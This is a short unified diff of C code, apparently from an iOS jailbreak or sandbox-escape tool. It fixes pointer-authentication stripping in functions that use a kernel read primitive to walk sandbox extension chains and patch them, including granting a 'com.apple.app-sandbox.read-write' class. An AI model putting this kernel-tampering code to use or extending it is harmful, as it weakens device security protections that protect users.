@@ -75,7 +75,7 @@ static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
 #pragma mark - Extension patching
 
 static void patch_ext(uint64_t ext) {
-    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
+    uint64_t da = S(early_kread64(ext + OFF_EXT_DATA));
     uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
     if (K(da) && dl > 0) {
         uint8_t buf[KRW_LEN];
@@ -95,9 +95,9 @@ static int patch_chain(uint64_t hdr) {
     for (int i = 0; i < 64 && K(hdr); i++) {
         uint64_t ext = S(early_kread64(hdr + 0x8));
         if (K(ext)) { patch_ext(ext); n++; }
-        uint64_t next = early_kread64(hdr);
+        uint64_t next = S(early_kread64(hdr));
         if (!next || !K(next)) break;
-        hdr = S(next);
+        hdr = next;
     }
     return n;
 }
@@ -105,7 +105,7 @@ static int patch_chain(uint64_t hdr) {
 static void set_rw_class(uint64_t hdr) {
     uint64_t ext = S(early_kread64(hdr + 0x8));
     if (!K(ext)) return;
-    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
+    uint64_t da = S(early_kread64(ext + OFF_EXT_DATA));
     if (!K(da)) return;
 
     const char *rw = "com.apple.app-sandbox.read-write";
